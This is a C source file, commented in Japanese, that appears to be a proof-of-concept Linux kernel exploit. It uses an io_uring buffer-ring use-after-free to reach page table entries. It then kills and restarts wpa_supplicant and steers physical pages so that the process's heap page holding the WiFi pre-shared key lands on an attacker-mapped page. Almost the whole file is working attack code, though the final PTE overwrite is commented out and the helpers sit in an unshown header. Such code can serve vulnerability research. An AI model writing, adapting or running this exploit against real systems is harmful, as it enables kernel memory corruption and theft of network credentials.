#include "wpa.h"
#include <unistd.h>
#include <err.h>
#include <string.h>
#include <stdio.h>
#include <ctype.h>
#include <sys/mman.h>
#include <liburing.h>
#include <stdlib.h>

/** page size */
#define PAGE_SIZE sysconf(_SC_PAGE_SIZE)

/* dummy page */
const int DUMMY_PAGE = 199;

/* busy loop */
const int BUSY_LOOP = 5;

// psk の heap 領域からのオフセットは 0x5000 の場合が多い
const int OFFSET = 0x5000;

int main() {
    // 領域を3つ確保
    void *new_map_1 = mmap(
        (void *)0xdead000000,
        0x1000,
        PROT_READ | PROT_WRITE,
        MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED,
        -1,
        0
    );
    if (new_map_1 == MAP_FAILED) {
        perror("mmap() failed");
        exit(1);
    }

    void *new_map_2 = mmap(
        (void *)0xdead200000,
        0x1000,
        PROT_READ | PROT_WRITE,
        MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED,
        -1,
        0
    );
    if (new_map_2 == MAP_FAILED) {
        perror("mmap() failed");
        exit(1);
    }

    void *new_map_3 = mmap(
        (void *)0xdead201000,
        0x1000,
        PROT_READ | PROT_WRITE,
        MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED,
        -1,
        0
    );
    if (new_map_3 == MAP_FAILED) {
        perror("mmap() failed");
        exit(1);
    }

    // io_uring の初期化
    struct io_uring ring;
    io_uring_queue_init(40, &ring, 0);
    printf("[+] uring_fd = %d\n", ring.ring_fd);

    // register buffer ring
    struct io_uring_buf_reg reg = {
        .ring_entries = 1,
        .bgid = 0,
        .flags = IOU_PBUF_RING_MMAP
    };
    io_uring_register_buf_ring(&ring, &reg, 0);

    // ユーザ空間にマップ
    void *pbuf_map = mmap(
        NULL,
        0x1000, 
        PROT_READ | PROT_WRITE,
        MAP_SHARED,
        ring.ring_fd,
        IORING_OFF_PBUF_RING
    );
    if (pbuf_map == MAP_FAILED) {
        perror("mmap() failed");
        exit(1);
    }
    printf("[+] pbuf mapped at %p\n", pbuf_map);

    // ページフォルト: 1 回目
    *(char *)new_map_1 = 'A';

    // ring 解放
    io_uring_unregister_buf_ring(&ring, reg.bgid);
    
    // ページフォルト: 2 回目
    // PTE が配置される
    // new_map_3 に秘密情報を誘導する
    *(char *)new_map_2 = 'A';
    *(char *)new_map_3 = 'A';

    dummy target_page;
    target_page.virt_addr = new_map_3;
    target_page.phys_addr = v2p(0, new_map_3);

    // Use-After-Free
    // PTE が配置されているか確認
    printf("[+] at %p: %lx\n", pbuf_map, *(unsigned long *)pbuf_map);
    printf("[+] at %p: %lx\n", (unsigned long *)pbuf_map + 1, *((unsigned long *)pbuf_map + 1));

    // PTE 書き換え
    // *(unsigned long *)pbuf_mapping = *((unsigned long *)pbuf_mapping + 1);

    // ページ解放
    if (munmap(pbuf_map, 0x1000) == -1) perror("munmap() failed");

    // ダミーページ確保
    dummy dummy_pages[DUMMY_PAGE];
    for (int i = 0; i < DUMMY_PAGE; i++) {
        dummy_pages[i].virt_addr = custom_mmap();
        if (dummy_pages[i].virt_addr == MAP_FAILED) continue;
        dummy_pages[i].phys_addr = v2p(0, dummy_pages[i].virt_addr);
    }

    // wpa_supplicant が起動中なら一度止める
    int res = 0;
    if (get_process_id()) {
        res = kill_wpa_supplicant();
    }
    if (res) {
        printf("[-] failed to kill wpa_supplicant\n");
        exit(1);
    }

    // 他のプロセスに CPU を譲る
    for (int _ = 0; _ < 10; _++) {
        sched_yield();
    }

    // new_map_3 解放
    if (munmap(new_map_3, 0x1000) == -1) perror("munmap() failed");

    // ダミーページ解放
    for (int i = 0; i < DUMMY_PAGE; i++) {
        munmap(dummy_pages[i].virt_addr, 0x1000);
    }

    // wpa_supplicant 起動
    if (start_wpa_supplicant()) {
        printf("[-] failed to start wpa_supplicant\n");
        exit(1);
    }
    printf("[+] start wpa_supplicant\n");

    // wpa_supplicant が秘密情報を配置するまで待機
    busy_loop(BUSY_LOOP);

    // wpa_supplicant のプロセスID取得
    int pid = get_process_id();
    printf("[+] pid = %d\n", pid);

    // wpa_supplicant プロセスの heap 領域のアドレスを取得
    uint64_t heap_addr = get_heap_start_address(pid);
    printf("[+] heap address = 0x%lx\n", heap_addr);

    // PSK のアドレス取得
    uint64_t psk_addr = heap_addr + OFFSET;
    printf("[+] psk address = 0x%lx\n", psk_addr);

    // 物理アドレス計算
    uint64_t phys_addr = v2p(pid, (void *)psk_addr);
    printf("[+] physical address = 0x%lx\n", phys_addr);

    // 誘導に成功したか確認
    if (target_page.phys_addr == phys_addr) {
        printf("[+] successfully lead to the target page\n");
    } else {
        printf("[-] failed lead to the target page\n");
    }

    // printf("[+] should be 'a' but '%c'\n", *(char *)addr_2);
    // printf("[+] %lx\n", *(unsigned long *)((char *)addr_2 + 0xb30));
    // printf("[+] %lx\n", *(unsigned long *)((char *)addr_2 + 0xb38));
    // printf("[+] %lx\n", *(unsigned long *)((char *)addr_2 + 0xb40));
    // printf("[+] %lx\n", *(unsigned long *)((char *)addr_2 + 0xb48));

    // メモリの解放関連
    if (munmap(new_map_1, 0x1000) == -1) perror("munmap() failed");
    if (munmap(new_map_2, 0x1000) == -1) perror("munmap() failed");
    io_uring_queue_exit(&ring);

    return 0;
}
